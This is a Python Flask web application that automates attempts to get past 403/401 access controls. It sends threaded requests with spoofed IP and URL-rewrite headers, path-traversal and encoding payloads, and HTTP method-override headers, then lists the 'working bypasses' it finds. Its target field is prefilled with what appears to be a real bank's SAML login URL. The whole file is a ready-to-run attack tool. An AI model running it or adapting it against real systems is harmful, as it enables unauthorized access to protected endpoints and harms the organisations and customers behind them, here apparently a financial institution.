#!/usr/bin/env python3
"""
403 / 401 Bypass Tool - Fully automatic, web-based.
Run: python bypass_tool.py
Then open http://localhost:5000
"""

from flask import Flask, render_template_string, request, jsonify, send_file
import threading
import requests
import time
import json
from urllib.parse import urlparse, quote
import sys
from collections import deque
import webbrowser

app = Flask(__name__)

# --------------------------------------------
# Payload libraries (thousands of combinations)
# --------------------------------------------

ip_headers = [
    "Client-IP", "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Forwarded-For-Original", "X-Proxy-Host", "X-Original-Remote-Addr",
    "True-Client-IP", "X-Host", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
    "X-Proxy-URL", "X-Forwarded-Server", "X-HTTP-DestinationURL", "X-Custom-IP-Authorization",
    "X-Forwarded-By", "X-Forwarder-For", "X-True-IP", "Referer", "Referrer", "Redirect",
    "Uri", "Url", "Http-Url", "Base-Url", "Request-Uri", "X-Client-IP", "X-Forward-For",
    "X-Forwarded", "X-Http-Destinationurl", "X-Http-Host-Override", "X-Original-Url",
    "X-Rewrite-Url", "X-Forwarded-Port", "X-Forwarded-Scheme"
]
ip_values = ["127.0.0.1", "0.0.0.0", "localhost", "::1", "10.0.0.1", "192.168.1.1", "172.16.0.1"]

path_bypasses = [
    "/.", "/../", "/%2e/", "/%2e%2e/", "/..;/", "/..%3B/", "/..%252f/",
    "/%252e%252e%252f", "/..;/admin", "/./admin", "//", "/./", "/;/admin",
    "/?/", "/#/", "/%20", "/%09", "/*/..", "/**/..", "/%61dmin/", "/%2561dmin/",
    "/%2f", "/%252f", "/%c0%ae%c0%ae/", "/%ef%bc%8f", "/%e2%80%ae"
]

verb_headers = ["X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override", "X-Original-Method"]
verb_values = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

# Build full payload list (thousands)
all_payloads = []

# Header spoofing
for h in ip_headers:
    for ip in ip_values:
        all_payloads.append(("header", f"{h}: {ip}"))

# Path bypasses
for bp in path_bypasses:
    all_payloads.append(("path", bp))

# Verb overrides
for h in verb_headers:
    for v in verb_values:
        all_payloads.append(("verb", f"{h}: {v}"))

print(f"[*] Loaded {len(all_payloads)} payloads")

# Global scan state
scan_running = False
scan_results = []
current_progress = 0
total_payloads = len(all_payloads)
stop_scan = False
target_url = ""
proxy = None
delay = 0
threads = 10

# --------------------------------------------
# Background scanner thread
# --------------------------------------------
def test_payload(payload):
    global proxy, delay, target_url
    try:
        ptype, pvalue = payload
        if ptype == "path":
            test_url = target_url.rstrip('/') + pvalue
            headers = {}
        else:
            test_url = target_url
            if ": " in pvalue:
                k, v = pvalue.split(": ", 1)
                headers = {k: v}
            else:
                headers = {}
        resp = requests.get(test_url, headers=headers, timeout=5, allow_redirects=False, proxies=proxy)
        return resp.status_code, len(resp.content), test_url
    except Exception:
        return None, 0, target_url

def scanner_worker():
    global scan_running, current_progress, scan_results, stop_scan, target_url, proxy, delay, threads
    scan_results = []
    current_progress = 0
    # Get baseline
    try:
        base_resp = requests.get(target_url, timeout=5, proxies=proxy)
        original_status = base_resp.status_code
        original_length = len(base_resp.content)
    except:
        original_status = None
        original_length = 0

    # Use threading pool
    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(test_payload, p): idx for idx, p in enumerate(all_payloads)}
        for future in as_completed(futures):
            if stop_scan:
                break
            idx = futures[future]
            p = all_payloads[idx]
            status, length, test_url = future.result()
            current_progress = idx + 1
            if status and original_status in (403, 401) and status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
                result = {
                    "payload": f"{p[0].upper()}: {p[1]}",
                    "status": status,
                    "url": test_url,
                    "type": "bypass"
                }
                scan_results.append(result)
            elif status == 200 and length != original_length:
                result = {
                    "payload": f"{p[0].upper()}: {p[1]}",
                    "status": status,
                    "url": test_url,
                    "type": "content_change"
                }
                scan_results.append(result)
            if delay:
                time.sleep(delay)
    scan_running = False

# --------------------------------------------
# Web routes
# --------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>403/401 Bypass Tool</title>
    <style>
        body { font-family: monospace; background: #0f172a; color: #e2e8f0; padding: 20px; }
        .container { max-width: 1200px; margin: auto; }
        .card { background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
        input, button, select { background: #0f172a; border: 1px solid #334155; color: white; padding: 8px 12px; border-radius: 8px; }
        button { background: #3b82f6; cursor: pointer; }
        button:disabled { opacity: 0.5; }
        .results { background: #0f172a; border-radius: 8px; padding: 10px; max-height: 500px; overflow-y: auto; }
        .result-item { border-left: 3px solid #4ade80; padding: 5px; margin: 5px 0; font-size: 0.8rem; }
        .progress { width: 100%; background: #334155; border-radius: 10px; margin: 10px 0; }
        .progress-bar { width: 0%; background: #3b82f6; border-radius: 10px; height: 20px; text-align: center; }
        .badge { background: #f59e0b; padding: 2px 6px; border-radius: 20px; font-size: 0.7rem; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 403 / 401 Bypass Tool</h1>
    <div class="card">
        <h3>Target</h3>
        <input type="text" id="target" style="width: 70%;" placeholder="https://target.com/admin" value="https://prepaid-cards.axisb.com/branchloginss/saml/log">
        <button id="startBtn">▶ Start Auto Scanner</button>
        <button id="stopBtn" disabled>⏹ Stop</button>
        <div style="margin-top: 10px;">
            <label>🌐 Proxy (optional):</label>
            <input type="text" id="proxy" placeholder="http://127.0.0.1:8080" style="width: 200px;">
            <label>⏱ Delay (s):</label>
            <input type="number" id="delay" value="0" step="0.1" style="width: 70px;">
            <label>🧵 Threads:</label>
            <input type="number" id="threads" value="10" style="width: 70px;">
        </div>
    </div>
    <div class="card">
        <h3>📊 Progress</h3>
        <div class="progress"><div class="progress-bar" id="progressBar">0%</div></div>
        <div id="statusText">Idle. Click Start.</div>
    </div>
    <div class="card">
        <h3>✅ Working Bypasses <span id="resultCount">0</span></h3>
        <div id="results" class="results">No results yet.</div>
    </div>
</div>
<script>
    let pollInterval;
    function startScan() {
        const target = document.getElementById('target').value;
        const proxy = document.getElementById('proxy').value;
        const delay = parseFloat(document.getElementById('delay').value);
        const threads = parseInt(document.getElementById('threads').value);
        fetch('/start', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target, proxy, delay, threads})
        }).then(r => r.json()).then(data => {
            if (data.status === 'ok') {
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
                pollInterval = setInterval(fetchStatus, 1000);
            } else alert(data.error);
        });
    }
    function stopScan() {
        fetch('/stop').then(() => {
            clearInterval(pollInterval);
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
        });
    }
    function fetchStatus() {
        fetch('/status').then(r => r.json()).then(data => {
            document.getElementById('progressBar').style.width = (data.progress / data.total * 100) + '%';
            document.getElementById('progressBar').innerText = Math.round(data.progress / data.total * 100) + '%';
            document.getElementById('statusText').innerText = data.running ? `Scanning... ${data.progress}/${data.total}` : 'Scan finished.';
            // Update results
            if (data.results.length > 0) {
                let html = '';
                data.results.forEach(r => {
                    html += `<div class="result-item">[${r.status}] ${r.payload}<br><small>${r.url}</small></div>`;
                });
                document.getElementById('results').innerHTML = html || 'No bypasses found.';
                document.getElementById('resultCount').innerText = data.results.length;
            }
            if (!data.running && data.progress === data.total) {
                clearInterval(pollInterval);
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
            }
        });
    }
    document.getElementById('startBtn').onclick = startScan;
    document.getElementById('stopBtn').onclick = stopScan;
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start', methods=['POST'])
def start_scan():
    global scan_running, target_url, proxy, delay, threads, stop_scan, scan_results
    if scan_running:
        return jsonify({"status": "error", "error": "Scan already running"})
    data = request.json
    target_url = data.get('target')
    if not target_url.startswith('http'):
        target_url = 'https://' + target_url
    proxy_url = data.get('proxy')
    proxy = {'http': proxy_url, 'https': proxy_url} if proxy_url else None
    delay = float(data.get('delay', 0))
    threads = int(data.get('threads', 10))
    stop_scan = False
    scan_running = True
    thread = threading.Thread(target=scanner_worker)
    thread.daemon = True
    thread.start()
    return jsonify({"status": "ok"})

@app.route('/stop')
def stop_scan_route():
    global stop_scan, scan_running
    stop_scan = True
    scan_running = False
    return jsonify({"status": "ok"})

@app.route('/status')
def status():
    global scan_running, current_progress, total_payloads, scan_results
    return jsonify({
        "running": scan_running,
        "progress": current_progress,
        "total": total_payloads,
        "results": scan_results[-50:]  # last 50 results
    })

if __name__ == '__main__':
    # Open browser automatically
    webbrowser.open('http://localhost:5000')
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)